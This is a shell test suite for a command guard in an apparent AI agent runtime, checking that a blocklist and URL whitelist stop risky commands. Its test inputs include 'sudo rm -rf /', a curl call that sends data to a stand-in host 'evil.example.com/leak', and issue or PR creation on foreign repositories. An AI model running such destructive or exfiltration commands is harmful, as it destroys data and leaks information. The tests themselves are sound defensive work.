#!/bin/sh
# test_bash-guard.sh — cobre global/skills/agente-00c-runtime/scripts/bash-guard.sh.

TESTS_ROOT="${TESTS_ROOT:-$(cd "$(dirname "$0")" && pwd)}"
REPO_ROOT="${REPO_ROOT:-$(cd "$TESTS_ROOT/.." && pwd)}"
. "$TESTS_ROOT/lib/harness.sh"

SCRIPT="$REPO_ROOT/global/skills/agente-00c-runtime/scripts/bash-guard.sh"

_make_wl() {
  _f="$TMPDIR_TEST/wl"
  cat > "$_f" <<EOF
https://api.github.com/repos/JotJunior/cstk/**
https://github.com/JotJunior/cstk
https://pkg.go.dev/**
EOF
  printf '%s\n' "$_f"
}

# ==== Blocklist ====

scenario_blocklist_sudo_bloqueado() {
  capture "$SCRIPT" check-blocklist --command "sudo rm -rf /"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "sudo" "esperado 1, obtido $_CAPTURED_EXIT"
    return 1
  fi
  assert_stderr_contains "sudo" || return 1
}

scenario_blocklist_npm_install_bloqueado() {
  capture "$SCRIPT" check-blocklist --command "npm install -g react"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "npm" "esperado 1, obtido $_CAPTURED_EXIT"
    return 1
  fi
  assert_stderr_contains "package-manager" || return 1
}

scenario_blocklist_docker_exec_npm_passa() {
  capture "$SCRIPT" check-blocklist --command "docker exec foo npm install"
  [ "$_CAPTURED_EXIT" = 0 ] || { _fail "docker exec npm" "$_CAPTURED_STDERR"; return 1; }
}

scenario_blocklist_pip_install_bloqueado() {
  capture "$SCRIPT" check-blocklist --command "pip install requests"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "pip" "esperado 1"
    return 1
  fi
}

scenario_blocklist_brew_install_bloqueado() {
  capture "$SCRIPT" check-blocklist --command "brew install jq"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "brew" "esperado 1"
    return 1
  fi
}

scenario_blocklist_git_push_bloqueado() {
  capture "$SCRIPT" check-blocklist --command "git push origin main"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "git push" "esperado 1"
    return 1
  fi
  assert_stderr_contains "Principio V" || return 1
}

scenario_blocklist_git_push_force_bloqueado() {
  capture "$SCRIPT" check-blocklist --command "git push --force-with-lease"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "git push force" "esperado 1"
    return 1
  fi
}

scenario_blocklist_git_fetch_passa() {
  capture "$SCRIPT" check-blocklist --command "git fetch origin"
  [ "$_CAPTURED_EXIT" = 0 ] || { _fail "git fetch" "$_CAPTURED_STDERR"; return 1; }
}

scenario_blocklist_kubectl_apply_bloqueado() {
  capture "$SCRIPT" check-blocklist --command "kubectl apply -f deploy.yaml"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "kubectl apply" "esperado 1"
    return 1
  fi
}

scenario_blocklist_kubectl_get_passa() {
  capture "$SCRIPT" check-blocklist --command "kubectl get pods"
  [ "$_CAPTURED_EXIT" = 0 ] || { _fail "kubectl get" "$_CAPTURED_STDERR"; return 1; }
}

scenario_blocklist_terraform_apply_bloqueado() {
  capture "$SCRIPT" check-blocklist --command "terraform apply -auto-approve"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "tf apply" "esperado 1"
    return 1
  fi
}

scenario_blocklist_terraform_plan_passa() {
  capture "$SCRIPT" check-blocklist --command "terraform plan"
  [ "$_CAPTURED_EXIT" = 0 ] || { _fail "tf plan" "$_CAPTURED_STDERR"; return 1; }
}

scenario_blocklist_docker_push_bloqueado() {
  capture "$SCRIPT" check-blocklist --command "docker push myimg:tag"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "docker push" "esperado 1"
    return 1
  fi
}

scenario_blocklist_helm_install_bloqueado() {
  capture "$SCRIPT" check-blocklist --command "helm install r ./chart"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "helm" "esperado 1"
    return 1
  fi
}

# ==== Whitelist ====

scenario_whitelist_url_permitida_passa() {
  _wl=$(_make_wl)
  capture "$SCRIPT" check-whitelist \
    --command "curl https://api.github.com/repos/JotJunior/cstk/issues" \
    --whitelist-file "$_wl"
  [ "$_CAPTURED_EXIT" = 0 ] || { _fail "wl OK" "$_CAPTURED_STDERR"; return 1; }
}

scenario_whitelist_url_fora_bloqueia() {
  _wl=$(_make_wl)
  capture "$SCRIPT" check-whitelist --command "curl https://evil.example.com/leak" \
    --whitelist-file "$_wl"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "wl outside" "esperado 1"
    return 1
  fi
  assert_stderr_contains "fora da whitelist" || return 1
}

scenario_whitelist_nao_network_passa() {
  _wl=$(_make_wl)
  capture "$SCRIPT" check-whitelist --command "ls /tmp" --whitelist-file "$_wl"
  [ "$_CAPTURED_EXIT" = 0 ] || { _fail "ls" "$_CAPTURED_STDERR"; return 1; }
}

scenario_whitelist_excecao_gh_issue_toolkit_passa() {
  _wl="$TMPDIR_TEST/empty-wl"
  : > "$_wl"
  # Mesmo com whitelist VAZIA, gh issue create no toolkit passa pela excecao
  capture "$SCRIPT" check-whitelist \
    --command "gh issue create --repo JotJunior/cstk --title 'x' --body 'y'" \
    --whitelist-file "$_wl"
  [ "$_CAPTURED_EXIT" = 0 ] || { _fail "gh issue toolkit" "$_CAPTURED_STDERR"; return 1; }
}

scenario_whitelist_gh_issue_outro_repo_bloqueia() {
  _wl=$(_make_wl)
  capture "$SCRIPT" check-whitelist \
    --command "gh issue create --repo other/repo --title 'leak'" \
    --whitelist-file "$_wl"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "gh issue other" "esperado 1, obtido $_CAPTURED_EXIT"
    return 1
  fi
}

scenario_whitelist_gh_pr_create_outro_bloqueia() {
  _wl=$(_make_wl)
  capture "$SCRIPT" check-whitelist \
    --command "gh pr create --repo evil/pr" \
    --whitelist-file "$_wl"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "gh pr other" "esperado 1"
    return 1
  fi
}

scenario_whitelist_gh_repo_clone_toolkit_passa() {
  _wl=$(_make_wl)
  capture "$SCRIPT" check-whitelist \
    --command "gh repo clone JotJunior/cstk" \
    --whitelist-file "$_wl"
  [ "$_CAPTURED_EXIT" = 0 ] || { _fail "gh repo clone" "$_CAPTURED_STDERR"; return 1; }
}

# ==== check (combinado) ====

scenario_check_combined_blocklist_falha_primeiro() {
  _wl=$(_make_wl)
  # sudo bloqueia em blocklist mesmo com URL valida
  capture "$SCRIPT" check \
    --command "sudo curl https://api.github.com/repos/JotJunior/cstk/foo" \
    --whitelist-file "$_wl"
  if [ "$_CAPTURED_EXIT" != 1 ]; then
    _fail "combined sudo" "esperado 1"
    return 1
  fi
  assert_stderr_contains "sudo" || return 1
}

run_all_scenarios
